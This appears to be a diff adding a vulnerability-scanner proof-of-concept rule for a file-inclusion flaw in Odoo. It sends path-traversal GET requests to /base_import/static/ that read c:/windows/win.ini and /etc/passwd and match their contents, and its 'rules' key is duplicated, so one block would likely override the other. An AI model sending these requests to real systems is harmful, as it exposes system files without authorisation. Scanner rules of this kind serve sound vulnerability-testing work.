@@ -1,0 +1,15 @@
+name: poc-yaml-Odoo-file-inclusion
+rules:
+  - method: GET
+    path: /base_import/static/c:/windows/win.ini
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+rules:
+  - method: GET
+    path: /base_import/static/etc/passwd
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"root:x:0:0:root:/tmp:/bin")
+detail:
+  author: amos
+  links:
+    - https://quake.360.cn/quake/#/vulDetail/QH-202006-1954/checked
